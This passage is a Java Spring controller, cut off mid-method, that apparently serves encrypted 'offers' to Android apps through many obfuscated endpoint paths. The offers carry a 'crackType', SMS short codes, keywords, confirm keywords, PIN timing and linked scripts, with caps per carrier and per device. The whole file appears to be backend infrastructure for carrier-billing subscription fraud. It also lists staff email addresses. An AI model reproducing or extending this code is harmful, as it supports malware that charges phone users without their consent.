package com.starp.zoo.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.starp.zoo.common.ResponseInfoEnum;
import com.starp.zoo.common.ResponseInfoUtil;
import com.starp.zoo.common.constant.Constants;
import com.starp.zoo.config.AndroidGroupGetAesConfig;
import com.starp.zoo.config.AndroidGroupGetDesConfig;
import com.starp.zoo.constant.CacheNameSpace;
import com.starp.zoo.constant.LogConstant;
import com.starp.zoo.constant.NumberEnum;
import com.starp.zoo.constant.ZooConstant;
import com.starp.zoo.entity.zoo.ApplicationModel;
import com.starp.zoo.entity.zoo.HttpLoggingModel;
import com.starp.zoo.entity.zoo.OfferModel;
import com.starp.zoo.entity.zoo.OfferStepModel;
import com.starp.zoo.entity.zoo.ScriptModel;
import com.starp.zoo.repo.zoo.HttpLoggingRepo;
import com.starp.zoo.service.IAffService;
import com.starp.zoo.service.IAndroidMncService;
import com.starp.zoo.service.IApplicationService;
import com.starp.zoo.service.IGetOfferService;
import com.starp.zoo.service.IOfferService;
import com.starp.zoo.service.IScriptService;
import com.starp.zoo.service.IUserAgentService;
import com.starp.zoo.util.*;
import edu.umd.cs.findbugs.annotations.SuppressFBWarnings;
import io.micrometer.core.annotation.Timed;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.net.URLEncoder;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author Charles
 * @date 2019/6/24
 * @description :
 */
@Slf4j
@RestController
public class AndroidGroupPullOfferWithEpmController {

    @Autowired
    private IApplicationService applicationService;

    @Autowired
    private IGetOfferService getOfferService;

    @Autowired
    private IAffService affService;

    @Autowired
    private IScriptService scriptService;

    @Autowired
    private IOfferService offerService;


    @Autowired
    private StringRedisTemplate stringRedisTemplate;

    @Resource(name = "cluster1RedisTemplate")
    private StringRedisTemplate cluster1RedisTemplate;

    @Autowired
    HttpLoggingRepo httpLoggingRepo;

    @Autowired
    private IAndroidMncService mncService;

    @Autowired
    IUserAgentService userAgentService;

    @Autowired
    EmailUtil emailUtil;

    /**
     * 每个半小时查询 epmList 保存
     */
    @GetMapping("/saveEpmListInfo")
    @ResponseBody
    public void saveEpmListInfo() {
        offerService.saveEpmListInfo();
    }

    /**
     * new GET_OFFER（线上）APP 拉取 offer 接口
     * @param body
     * @param request
     * @param response
     * @return java.lang.String
     * @author Curry
     * @date 2022/11/1
     */
    @Timed
    @SuppressFBWarnings({"DM_DEFAULT_ENCODING", "DM_DEFAULT_ENCODING", "NP_ALWAYS_NULL", "RCN_REDUNDANT_NULLCHECK_OF_NONNULL_VALUE", "NP_NULL_PARAM_DEREF"})
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping({"/gpbill","/cpull", "/cabortion", "/gaccident", "/cacross", "/gadd", "/cadolescent", "/gaffair", "/caggressive", "/galliance",
            "/camerican", "/gannounce", "/csapart", "/gappreciate", "/carmed", "/caside", "/gassistance", "/cattempt", "/cavailable", "/cbadly",
            "/cbase", "/gbear", "/gbehind", "/gcake", "/ccapital", "/ccast"})
    public byte[] getConfigForChet(@RequestBody(required = false) byte[] body, HttpServletRequest request, HttpServletResponse response) throws Exception {
        AesUtil desUtil = AndroidGroupGetAesConfig.getAes(request);
        int encodeType = 1;
        if (request.getRequestURI().indexOf(ZooConstant.SPLIT_C) == -1) {
            encodeType = 2;
        }
        try {
            if (StringUtils.isEmpty(body) || StringUtils.isEmpty(desUtil.decode(body, encodeType))) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_OFFER_REQUEST.getCode(), ResponseInfoEnum.NULL_OFFER_REQUEST.getMsg());
                return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
            }
            String appId = "";
            String deviceId = "";
            String mnc = "";
            boolean isTest = false;
            boolean isLog = false;
            List<String> usedList = new ArrayList<>();
            JSONObject params = JSONObject.parseObject(new String(desUtil.decode(body, encodeType)));
            String ipAddress = IpUtil.getIpAddr(request);
            if (params != null) {
                appId = params.getString("appId");
                deviceId = params.getString("deviceId");
                mnc = params.getString("mnc");
                isLog = params.getBoolean("isLog") != null ? params.getBoolean("isLog") : false;
                isTest = params.getBoolean("isTest") != null ? params.getBoolean("isTest") : false;
                usedList = params.getJSONArray("used") != null ? JSONObject.parseArray(params.getJSONArray("used").toJSONString(), String.class) : null;
            }
            String operator = mncService.generateOp(mnc);
            OfferModel resultModel = null;
            if (StringUtils.isEmpty(appId)) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_APPID.getCode(), ResponseInfoEnum.NULL_APPID.getMsg());
                return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
            }
            ApplicationModel applicationModel = applicationService.getAppModel(appId);
            if (isLog) {
                log.info("{} [PULL_TASK_WITH_EPM] [APP:{}] [IP:{}] [APP_MODEL:{}]", LogConstant.ZOO, appId, ipAddress, operator, JSON.toJSONString(applicationModel));
            }
            //获取可用offer
            if (applicationModel == null) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.APPID_NULL.getCode(), ResponseInfoEnum.APPID_NULL.getMsg());
                return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
            }
            boolean appIsAlive = applicationModel.getStatus() == ZooConstant.STATUS_1;
            if (!appIsAlive) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.CLOSE_APP.getCode(), ResponseInfoEnum.CLOSE_APP.getMsg());
                return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
            }
            int appOperatorCap = getOperatorCap(appId, operator, applicationModel);
            int userAppOperatorTrans = getUserAppTrans(appId, operator, deviceId);
            boolean userOverAppOperatorTransNum = userAppOperatorTrans >= appOperatorCap;
            if (userOverAppOperatorTransNum) {
                // 如果已经超出两个, 也不能拉取测试offer
                if (userAppOperatorTrans >= appOperatorCap + NumberEnum.TWO.getNum()) {
                    String errorMessage = formatErrorMessage(ResponseInfoEnum.OVER_APP_MAX_TRANS_OPERATOR_NUM.getCode(), ResponseInfoEnum.OVER_APP_MAX_TRANS_OPERATOR_NUM.getMsg());
                    return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
                }
            }
            resultModel = getOfferService.getEnableOfferModel(deviceId, appId, ipAddress, operator, usedList, isLog, isTest);
            if (resultModel != null && !StringUtils.isEmpty(resultModel.getErrorMsg())) {
                String errorMessage = formatErrorMessage(resultModel.getErrorCode(), resultModel.getErrorMsg());
                return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
            }
            //如果offer没有crackType,则默认为1（利刃）
            if (resultModel != null && resultModel.getCrackType() == null) {
                resultModel.setCrackType(1);
            }
            return getOfferStrByte(resultModel, appId, ipAddress, deviceId, request, response, isTest, isLog, mnc, params, desUtil, encodeType);
        } catch (Exception e) {
            log.info("ZOO PULL OFFER ERROR:{}", JSON.toJSONString(e));
            String errorMessage = formatErrorMessage(ResponseInfoEnum.DESC_DECODE_ERROR.getCode(), ResponseInfoEnum.DESC_DECODE_ERROR.getMsg());
            return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
        }
    }

    /**
     * APP 拉取 offer 接口
     * GET_OFFER（线上）
     *
     * @param body
     * @param request
     * @param response
     * @return
     * @throws IOException
     */
    @Timed
    @SuppressFBWarnings({"DM_DEFAULT_ENCODING", "NP_ALWAYS_NULL", "RCN_REDUNDANT_NULLCHECK_OF_NONNULL_VALUE", "NP_NULL_PARAM_DEREF"})
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/xxa/2344x","/gn3/6809z","/9xc/as541","/c4j/768sa", "/vcx/547dd","/66s/4gj32", "/hg5/mnbik","/fd5/908lz","/d9k/cfn8z", "/tsh/xu1sj", "/msw/duz4d", "/yen/dui4a", "/jk5/j6687","/hgk/hfgh5","/9gd/j4561","/ehn/ci4h5", "/ydn/du5nj", "/yts/su92d", "/pue/sdj5i", "/uxb/sdnbf","/f12/12erz", "/idn/fuc8n", "/njp/duaqk", "/nhz/sduiq", "/cdb/xbhsz","/47q/487lk","/ugj/fh544","/0pz/bfe23", "/dic/pod5d", "/uud/dfnkc", "/bui/cb5bz", "/niw/nzj2j", "/bnv/dsfk9", "/ysh/xhj78", "/svz/ma34s", "/yui/cduia", "/ya2/dbh98", "/klt/xv3jR", "/xcv/Nlm3s", "/nks/ajH2n", "/oe3/7HJKs", "/lsg/rkjGs", "/vjs/trp7O", "/out/xbfTk", "/Bh6/zbkkp", "/ger/msTgf", "/sbv/bkBst", "/cks/pkvT3", "/vks/blgb2", "/xcj/klbYj", "/yus/jbngT", "/wui/hu2on"}, method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String getConfig(@RequestBody(required = false) String body, HttpServletRequest request, HttpServletResponse response) throws Exception {
        DesUtil desUtil = AndroidGroupGetDesConfig.getDes(request);
        try {
            if (StringUtils.isEmpty(body) || StringUtils.isEmpty(desUtil.decode(body))) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_OFFER_REQUEST.getCode(), ResponseInfoEnum.NULL_OFFER_REQUEST.getMsg());
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            }
            String appId = "";
            String deviceId = "";
            String mnc = "";
            boolean isTest = false;
            boolean isLog = false;
            List<String> usedList = new ArrayList<>();
            JSONObject params = JSONObject.parseObject(desUtil.decode(body));
            String ipAddress = IpUtil.getIpAddr(request);
            if (params != null) {
                appId = params.getString("appId");
                deviceId = params.getString("deviceId");
                mnc = params.getString("mnc");
                isLog = params.getBoolean("isLog") != null ? params.getBoolean("isLog") : false;
                isTest = params.getBoolean("isTest") != null ? params.getBoolean("isTest") : false;
                usedList = params.getJSONArray("used") != null ? JSONObject.parseArray(params.getJSONArray("used").toJSONString(), String.class) : null;
            }
            // 缓存中取
            String operator = mncService.generateOp(mnc);
            OfferModel resultModel = null;
            if (StringUtils.isEmpty(appId)) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_APPID.getCode(), ResponseInfoEnum.NULL_APPID.getMsg());
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            }
            // 缓存中取
            ApplicationModel applicationModel = applicationService.getAppModel(appId);
            if (isLog) {
                log.info("{} [PULL_TASK_WITH_EPM] [APP:{}] [IP:{}] [APP_MODEL:{}]", LogConstant.ZOO, appId, ipAddress, operator, JSON.toJSONString(applicationModel));
            }
            //获取可用offer
            if (applicationModel == null) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.APPID_NULL.getCode(), ResponseInfoEnum.APPID_NULL.getMsg());
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            }
            //判断app是否开启
            boolean appIsAlive = applicationModel.getStatus() == ZooConstant.STATUS_1;
            if (!appIsAlive) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.CLOSE_APP.getCode(), ResponseInfoEnum.CLOSE_APP.getMsg());
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            }
            int appOperatorCap = getOperatorCap(appId, operator, applicationModel);
            int userAppOperatorTrans = getUserAppTrans(appId, operator, deviceId);
            boolean userOverAppOperatorTransNum = userAppOperatorTrans >= appOperatorCap;
            if (userOverAppOperatorTransNum) {
                // 如果已经超出两个, 也不能拉取测试offer
                if (userAppOperatorTrans >= appOperatorCap + NumberEnum.TWO.getNum()) {
                    String errorMessage = formatErrorMessage(ResponseInfoEnum.OVER_APP_MAX_TRANS_OPERATOR_NUM.getCode(), ResponseInfoEnum.OVER_APP_MAX_TRANS_OPERATOR_NUM.getMsg());
                    return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
                }
            }
            //获取可用offer
            resultModel = getOfferService.getEnableOfferModel(deviceId, appId, ipAddress, operator, usedList, isLog, isTest);
            if (resultModel != null && !StringUtils.isEmpty(resultModel.getErrorMsg())) {
                String errorMessage = formatErrorMessage(resultModel.getErrorCode(), resultModel.getErrorMsg());
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            }
            //如果offer没有crackType,则默认为1（利刃）
            if (resultModel != null && resultModel.getCrackType() == null) {
                resultModel.setCrackType(1);
            }
            return getOfferStr(resultModel, appId, ipAddress, deviceId, request, response, isTest, isLog, mnc, params, desUtil);
        } catch (Exception e) {
            log.info("ZOO PULL OFFER ERROR:{}", JSON.toJSONString(e));
            String errorMessage = formatErrorMessage(ResponseInfoEnum.DESC_DECODE_ERROR.getCode(), ResponseInfoEnum.DESC_DECODE_ERROR.getMsg());
            return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
        }
    }

    @SuppressFBWarnings("DM_BOXED_PRIMITIVE_FOR_PARSING")
    private int getUserAppTrans(String appId, String operator, String deviceId) {
        int transNum = 0;
        String transKey = CacheNameSpace.ZOO_USER_TRANS_LIST + appId + CacheNameSpace.COLON + deviceId + CacheNameSpace.COLON + operator + CacheNameSpace.COLON + DateUtil.today();
        List<Object> values = cluster1RedisTemplate.opsForHash().values(transKey);
        if (values != null && values.size() > 0) {
            transNum = values.size();
        }
        return transNum;
    }

    /**
     * 拉取线下包接口
     * GET_OFFER（线下）
     *
     * @param body
     * @param request
     * @param response
     * @return
     * @throws Exception
     */
    @SuppressFBWarnings({"DM_DEFAULT_ENCODING", "NP_ALWAYS_NULL", "RCN_REDUNDANT_NULLCHECK_OF_NONNULL_VALUE"})
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = {"/du7/isnyb", "/wko/bj71z", "/akn/dfnj2", "/cyn/isn5a", "/dsh/c7d2h", "/eui/5q3ud", "/ix1/73bjd", "/yyn/7hjGj", "/dfJ/Vm2Ms", "/sxb/sjv3B", "/knb/pkoT5", "/wvc/ksn5T", "/gj1/hgJ4t", "/bnj/BU8jk", "/wre/lkaJt", "/brm/cxfgE", "/vjg/ptjBn", "/uyt/ap3sX", "/gpf/lgkbt", "/vjs/dkTmr", "/ope/Hkl2j"}, method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String getOfflineConfig(@RequestBody(required = false) String body, HttpServletRequest request, HttpServletResponse response) throws Exception {
        DesUtil desUtil = AndroidGroupGetDesConfig.getDes(request);
        try {
            String appId = "";
            String deviceId = "";
            String mnc = "";
            boolean isTest = false;
            boolean isLog = false;
            List<String> usedList = new ArrayList<>();
            JSONObject params = JSONObject.parseObject(desUtil.decode(body));
            String ipAddress = IpUtil.getIpAddr(request);
            if (params != null) {
                log.info("{} [PULL OFFER WITH EPM] [REQUEST BODY:{}]", LogConstant.ZOO, JSON.toJSONString(params));
                appId = params.getString("appId");
                deviceId = params.getString("deviceId");
                mnc = params.getString("mnc");
                isLog = params.getBoolean("isLog") != null ? params.getBoolean("isLog") : false;
                isTest = params.getBoolean("isTest") != null ? params.getBoolean("isTest") : false;
                usedList = params.getJSONArray("used") != null ? JSONObject.parseArray(params.getJSONArray("used").toJSONString(), String.class) : null;
            }
            String operator = mncService.generateOp(mnc);
            OfferModel resultModel = null;
            if (!StringUtils.isEmpty(appId)) {
                String appStr = cluster1RedisTemplate.opsForValue().get(CacheNameSpace.ZOO_APP + CacheNameSpace.COLON + appId);
                ApplicationModel applicationModel = null;
                if (!StringUtils.isEmpty(appStr)) {
                    applicationModel = JSON.parseObject(appStr, ApplicationModel.class);
                }boolean appIsAlive = applicationModel != null && applicationModel.getStatus() == ZooConstant.STATUS_1;
                if (!appIsAlive) {
                    String errorMessage = formatErrorMessage(ResponseInfoEnum.CLOSE_APP.getCode(), ResponseInfoEnum.CLOSE_APP.getMsg());
                    return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
                }
                int appCap = getOperatorCap(appId, operator, applicationModel);
                boolean appOverMaxPullNum = applicationModel != null && usedList != null && usedList.size() >= appCap;
                if (appOverMaxPullNum) {
                    String errorMessage = formatErrorMessage(ResponseInfoEnum.OVER_APP_MAX_TRANS_NUM.getCode(), ResponseInfoEnum.OVER_APP_MAX_TRANS_NUM.getMsg());
                    return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
                }resultModel = getOfferService.getEnableOfferModel(deviceId, appId, ipAddress, operator, usedList, isLog, isTest);
                if (resultModel != null && !StringUtils.isEmpty(resultModel.getErrorMsg())) {
                    String errorMessage = formatErrorMessage(resultModel.getErrorCode(), resultModel.getErrorMsg());
                    return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
                }
                if (resultModel != null && resultModel.getCrackType() == NumberEnum.ONE.getNum()) {
                    formatConfig(resultModel, appId, ipAddress, deviceId, request, response, isTest);
                    String result = JSON.toJSONString(getOfflineResultMap(resultModel));
                    if (!StringUtils.isEmpty(request)) {
                        return ResponseInfoUtil.success(result, desUtil);
                    } else {
                        String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_OFFER_REQUEST.getCode(), ResponseInfoEnum.NULL_OFFER_REQUEST.getMsg());
                        return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
                    }

                } else if (resultModel != null && resultModel.getCrackType() == NumberEnum.TWO.getNum()) {
                    String result = handleHttp(ipAddress, appId, mnc, params, request, isLog, resultModel, deviceId);
                    JSONObject resModel = JSON.parseObject(result);
                    if (resModel != null && !StringUtils.isEmpty(resModel.getString(ZooConstant.ERROR_CODE))) {
                        String errorMessage = formatErrorMessage(Integer.valueOf(resModel.getString("errorCode")), resModel.getString("errorMsg"));
                        return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
                    } else {
                        return ResponseInfoUtil.success(result, desUtil);
                    }
                }
            } else {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_APPID.getCode(), ResponseInfoEnum.NULL_APPID.getMsg());
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            }
        } catch (Exception e) {
            log.info("ZOO PULL OFFER ERROR:{}", JSON.toJSONString(e));
            if (JSON.toJSONString(e).indexOf(ZooConstant.REDIS_OUTOFDIRECTMEMORY) > -1) {
                sendAlaramMail(request.getLocalAddr(), ZooConstant.REDIS_OUTOFDIRECTMEMORY);
            }
            String errorMessage = formatErrorMessage(ResponseInfoEnum.DESC_DECODE_ERROR.getCode(), ResponseInfoEnum.DESC_DECODE_ERROR.getMsg());
            return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
        }
        return "";
    }

    private void sendAlaramMail(String localAddr, String errorInfo) {
        try {
            Map<String, Object> contentModel = new HashMap<>(8);
            contentModel.put(ZooConstant.TITLE, ZooConstant.ZOO_REDIS_ERROR_MAIL_SUBJECT);
            contentModel.put(ZooConstant.IP, localAddr);
            contentModel.put(ZooConstant.SYSTEM, LogConstant.ZOO);
            contentModel.put(ZooConstant.EMAIL_DATE, DateUtil.formatyyyyMMddHHmmss(new Date()));
            contentModel.put(ZooConstant.MESSAGE, errorInfo);
            String[] emails = {"traffic@starpavilion-digital.com", "aaron.huang@starpavilion-digital.com",
                    "cherry.wang@starpavilion-digital.com", "david.li@starpavilion-digital.com", "alie.shi@starpavilion-digital.com"};
            emailUtil.sendMimeMessageMail(ZooConstant.ZOO_REDIS_ERROR_MAIL_TEMPLATE, emails[emails.length - 1], ZooConstant.ZOO_REDIS_ERROR_MAIL_SUBJECT, contentModel, emails);
        } catch (Exception e) {
            log.error("SEND REDIS ERROR MAIL EXCEPTION:{}", JSON.toJSONString(e));
        }

    }

    /**
     * 获取线下包的配置
     *
     * @param model
     * @return
     */
    private Map getOfflineResultMap(OfferModel model) {
        Map<String, Object> result = new HashMap<>(3);
        if (model != null) {
            //返回当前时间戳和 list
            result.put("offer", getOfflineOfferJSON(model));
            result.put("crackType", model.getCrackType());
            // 找到关联的 js 脚本
            List<ScriptModel> scriptModels = scriptService.findScriptByOfferId(model.getIdentification());
            if (scriptModels != null && scriptModels.size() > 0) {
                result.put("script", getScriptJSON(scriptModels));
            }
        }
        return result;
    }


    private JSONObject getOfflineOfferJSON(OfferModel model) {
        JSONObject jsonObject = new JSONObject();
        if (model != null) {
            jsonObject.put("identification", model.getIdentification());
            jsonObject.put("partner", model.getPartner());
            jsonObject.put("isCrawlHtml", model.getIsCrawlHtml());
            jsonObject.put("type", model.getType());
            jsonObject.put("duration", model.getDuration());
            jsonObject.put("url", model.getUrl());
            if (model.getType().equalsIgnoreCase(ZooConstant.OFFER_MO)) {
                jsonObject.put("shortCode", model.getShortCode());
                jsonObject.put("keyword", model.getKeyword());
            } else if (model.getType().equalsIgnoreCase(ZooConstant.OFFER_PIN_MO)) {
                jsonObject.put("shortCode", model.getShortCode());
                jsonObject.put("keyword", model.getKeyword());
                jsonObject.put("intervalTime", model.getIntervalTime());
            } else if (model.getType().equalsIgnoreCase(ZooConstant.OFFER_DOUBLE_MO)) {
                jsonObject.put("shortCode", model.getShortCode());
                jsonObject.put("keyword", model.getKeyword());
                jsonObject.put("intervalTime", model.getIntervalTime());
                jsonObject.put("confirmKeyword", model.getConfirmKeyword());
            }
        }
        return jsonObject;
    }

    @SuppressFBWarnings("DM_BOXED_PRIMITIVE_FOR_PARSING")
    private int getOperatorCap(String appId, String operator, ApplicationModel applicationModel) {
        String cap = "0";
        if (applicationModel != null) {
            cap = String.valueOf(applicationModel.getMaxPullNum());
            String key = ZooConstant.APP_OPERATOR_CAP_KEY;
            String hashKey = operator + ZooConstant.COLON + appId;
            Object capValue = cluster1RedisTemplate.opsForHash().get(key, hashKey);
            if (capValue != null) {
                cap = String.valueOf(capValue);
            }
        }
        return Integer.parseInt(cap);
    }

    /**
     * APP 拉取 offer 接口不加密解密
     *
     * @param params
     * @param request
     * @param response
     * @return
     * @throws Exception
     */
    @SuppressFBWarnings({"DM_DEFAULT_ENCODING", "NP_ALWAYS_NULL", "RCN_REDUNDANT_NULLCHECK_OF_NONNULL_VALUE", "NP_NULL_PARAM_DEREF"})
    @CrossOrigin(origins = "*", maxAge = 3600)
    @RequestMapping(value = "/app/offer/without/des", method = {RequestMethod.POST, RequestMethod.GET})
    @ResponseBody
    public String getConfig(@RequestBody(required = false) JSONObject params, HttpServletRequest request, HttpServletResponse response) throws Exception {
        try {
            String appId = "";
            String deviceId = "";
            String mnc = "";
            boolean isTest = false;
            boolean isLog = false;
            List<String> usedList = new ArrayList<>();
            String ipAddress = IpUtil.getIpAddr(request);
            if (params != null) {
                log.info("{} [PULL OFFER WITH EPM] [REQUEST BODY:{}]", LogConstant.ZOO, JSON.toJSONString(params));
                appId = params.getString("appId");
                deviceId = params.getString("deviceId");
                mnc = params.getString("mnc");
                isLog = params.getBoolean("isLog") != null ? params.getBoolean("isLog") : false;
                isTest = params.getBoolean("isTest") != null ? params.getBoolean("isTest") : false;
                usedList = params.getJSONArray("used") != null ? JSONObject.parseArray(params.getJSONArray("used").toJSONString(), String.class) : null;
            }
            String operator = mncService.generateOp(mnc);
            OfferModel resultModel = null;
            ApplicationModel applicationModel = null;
            if (StringUtils.isEmpty(appId)) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_APPID.getCode(), ResponseInfoEnum.NULL_APPID.getMsg());
                return errorMessage;
            }
            Boolean existAppRedis = stringRedisTemplate.opsForHash().hasKey(CacheNameSpace.ZOO_APP, StringUtils.isEmpty(appId) ? "" : appId);
            if (existAppRedis != null && existAppRedis) {
                applicationModel = JSON.parseObject(String.valueOf(cluster1RedisTemplate.opsForHash().get(CacheNameSpace.ZOO_APP, appId)), ApplicationModel.class);
            }
            if (isLog) {
                log.info("{} [PULL_TASK_WITH_EPM] [APP:{}] [IP:{}] [APP_MODEL:{}]", LogConstant.ZOO, appId, ipAddress, operator, JSON.toJSONString(applicationModel));
            }
            //判断app是否开启
            boolean appIsAlive = applicationModel != null && applicationModel.getStatus() == ZooConstant.STATUS_1;
            if (!appIsAlive) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.CLOSE_APP.getCode(), ResponseInfoEnum.CLOSE_APP.getMsg());
                return errorMessage;
            }
            int appOperatorCap = getOperatorCap(appId, operator, applicationModel);
            int userAppOperatorTrans = getUserAppTrans(appId, operator, deviceId);
            boolean userOverAppOperatorTransNum = applicationModel != null && userAppOperatorTrans >= appOperatorCap;
            if (userOverAppOperatorTransNum) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.OVER_APP_MAX_TRANS_OPERATOR_NUM.getCode(), ResponseInfoEnum.OVER_APP_MAX_TRANS_OPERATOR_NUM.getMsg());
                return errorMessage;
            }
            //获取可用offer
            if (null == appId) {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.APPID_NULL.getCode(), ResponseInfoEnum.APPID_NULL.getMsg());
                return errorMessage;
            }
            resultModel = getOfferService.getEnableOfferModel(deviceId, appId, ipAddress, operator, usedList, isLog, isTest);
            if (resultModel != null && !StringUtils.isEmpty(resultModel.getErrorMsg())) {
                String errorMessage = formatErrorMessage(resultModel.getErrorCode(), resultModel.getErrorMsg());
                return errorMessage;
            }
            //如果offer没有crackType,则默认为1（利刃）
            if (resultModel != null && resultModel.getCrackType() == null) {
                resultModel.setCrackType(1);
            }
            if (resultModel != null) {
                return getOfferStrWithoutDes(resultModel, appId, ipAddress, deviceId, request, response, isTest, isLog, mnc, params);
            } else {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_ENABLE_OFFER.getCode(), ResponseInfoEnum.NULL_ENABLE_OFFER.getMsg());
                return errorMessage;
            }
        } catch (Exception e) {
            log.info("ZOO PULL OFFER ERROR:{}", JSON.toJSONString(e));
            String errorMessage = formatErrorMessage(ResponseInfoEnum.DESC_DECODE_ERROR.getCode(), ResponseInfoEnum.DESC_DECODE_ERROR.getMsg());
            return errorMessage;
        }
    }

    @SuppressFBWarnings("NP_NULL_PARAM_DEREF")
    private byte[] getOfferStrByte(OfferModel resultModel, String appId, String ipAddress, String deviceId, HttpServletRequest request, HttpServletResponse response, boolean isTest, boolean isLog, String mnc, JSONObject params, AesUtil desUtil, int encodeType) throws Exception {
        // 破解类型为利刃或者 利刃-風の剣
        boolean isCrackTypeOne = resultModel != null && resultModel.getCrackType() != null && (resultModel.getCrackType() == NumberEnum.ONE.getNum() || resultModel.getCrackType() == NumberEnum.THREE.getNum());
        boolean isCrackTypeTwo = resultModel != null && resultModel.getCrackType() != null && (resultModel.getCrackType() == NumberEnum.TWO.getNum() || resultModel.getCrackType() == NumberEnum.FOUR.getNum());
        formatConfig(resultModel, appId, ipAddress, deviceId, request, response, isTest);
        if (isCrackTypeOne) {
            String result = JSON.toJSONString(getResultMap(resultModel));
            log.info("ALEX PULL OFFER,OFFERID:{},APPID:{},PARAMS:{},RESULT:{}", resultModel.getIdentification(), appId, JSON.toJSONString(params), result);
            if (!StringUtils.isEmpty(request)) {
                return ResponseInfoUtil.successByte(result, desUtil, encodeType);
            } else {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_OFFER_REQUEST.getCode(), ResponseInfoEnum.NULL_OFFER_REQUEST.getMsg());
                return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
            }
        } else if (isCrackTypeTwo) {
            String result = handleHttp(ipAddress, appId, mnc, params, request, isLog, resultModel, deviceId);
            JSONObject resModel = JSON.parseObject(result);
            log.info("SOWRD PULL OFFER,OFFERID:{},APPID:{},PARAMS:{},RESULT:{}", resultModel.getIdentification(), appId, JSON.toJSONString(params), result);
            if (resModel != null && !StringUtils.isEmpty(resModel.getString(ZooConstant.ERROR_CODE))) {
                String errorMessage = formatErrorMessage(Integer.valueOf(resModel.getString("errorCode")), resModel.getString("errorMsg"));
                return ResponseInfoUtil.errorMsgByte(errorMessage, desUtil, encodeType);
            } else {
                return ResponseInfoUtil.successByte(result, desUtil, encodeType);
            }
        }
        return new byte[1];
    }

    @SuppressFBWarnings("NP_NULL_PARAM_DEREF")
    private String getOfferStr(OfferModel resultModel, String appId, String ipAddress, String deviceId, HttpServletRequest request, HttpServletResponse response, boolean isTest, boolean isLog, String mnc, JSONObject params, DesUtil desUtil) throws Exception {
        // 破解类型为利刃或者 利刃-風の剣
        boolean isCrackTypeOne = resultModel != null && resultModel.getCrackType() != null && (resultModel.getCrackType() == NumberEnum.ONE.getNum() || resultModel.getCrackType() == NumberEnum.THREE.getNum());
        boolean isCrackTypeTwo = resultModel != null && resultModel.getCrackType() != null && (resultModel.getCrackType() == NumberEnum.TWO.getNum() || resultModel.getCrackType() == NumberEnum.FOUR.getNum());
        formatConfig(resultModel, appId, ipAddress, deviceId, request, response, isTest);
        if (isCrackTypeOne) {
            String result = JSON.toJSONString(getResultMap(resultModel));
            log.info("ALEX PULL OFFER,OFFERID:{},APPID:{},PARAMS:{},RESULT:{}", resultModel.getIdentification(), appId, JSON.toJSONString(params), result);
            if (!StringUtils.isEmpty(request)) {
                return ResponseInfoUtil.success(result, desUtil);
            } else {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_OFFER_REQUEST.getCode(), ResponseInfoEnum.NULL_OFFER_REQUEST.getMsg());
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            }
        } else if (isCrackTypeTwo) {
            String result = handleHttp(ipAddress, appId, mnc, params, request, isLog, resultModel, deviceId);
            JSONObject resModel = JSON.parseObject(result);
            log.info("SOWRD PULL OFFER,OFFERID:{},APPID:{},PARAMS:{},RESULT:{}", resultModel.getIdentification(), appId, JSON.toJSONString(params), result);
            if (resModel != null && !StringUtils.isEmpty(resModel.getString(ZooConstant.ERROR_CODE))) {
                String errorMessage = formatErrorMessage(Integer.valueOf(resModel.getString("errorCode")), resModel.getString("errorMsg"));
                return ResponseInfoUtil.errorMsg(errorMessage, desUtil);
            } else {
